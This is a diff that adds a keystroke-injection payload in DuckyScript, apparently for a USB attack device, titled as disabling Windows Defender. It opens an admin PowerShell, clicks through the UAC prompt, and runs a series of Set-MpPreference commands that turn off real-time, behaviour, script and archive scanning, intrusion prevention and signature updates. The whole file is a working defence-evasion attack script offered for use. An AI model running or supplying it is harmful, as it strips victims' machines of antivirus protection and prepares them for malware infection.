@@ -1,0 +1,45 @@
+REM Windows Defender Disable (Requires Admin)
+REM Disables Windows Defender via PowerShell
+DELAY 2000
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+DELAY 500
+STRING powershell Start-Process powershell -Verb RunAs
+ENTER
+DELAY 1500
+ALT y
+DELAY 1500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableBehaviorMonitoring $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableBlockAtFirstSeen $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableIOAVProtection $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisablePrivacyMode $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableArchiveScanning $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableIntrusionPreventionSystem $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableScriptScanning $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -SubmitSamplesConsent 2
+ENTER
+DELAY 500
+STRING exit
+ENTER
